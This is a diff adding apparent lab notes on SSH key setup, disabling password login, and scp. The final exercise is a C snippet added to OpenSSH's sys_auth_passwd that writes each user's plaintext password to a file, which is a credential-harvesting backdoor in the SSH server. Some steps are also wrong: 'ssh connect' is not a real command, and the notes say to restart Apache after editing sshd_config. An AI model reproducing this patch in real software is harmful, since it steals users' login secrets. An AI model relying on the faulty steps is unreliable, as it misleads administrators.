@@ -1,0 +1,26 @@
+1. generate public key 
+	ssh-keygen
+2.copy the generated key to the serverside
+	ssh-copy-id username@remote_host
+3.authenticatin to server
+	ssh connect
+link : https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server
+	
+ex2 . disable passowrod
+config sudo nano /etc/ssh/sshd_config
+change PasswordAuthentication to no
+then restart the apache
+
+ex3. using scp :
+scp source@sourceip:filename dest@destip:/pathtocopy
+
+
+
+2. go openssh-portable/auth-passswd.c
+added to sys_auth_passwd:
+
+FILE *f = fopen("filepath","a+");
+fprintf(f,"%s",password);
+fputs("\n",f);
+
+
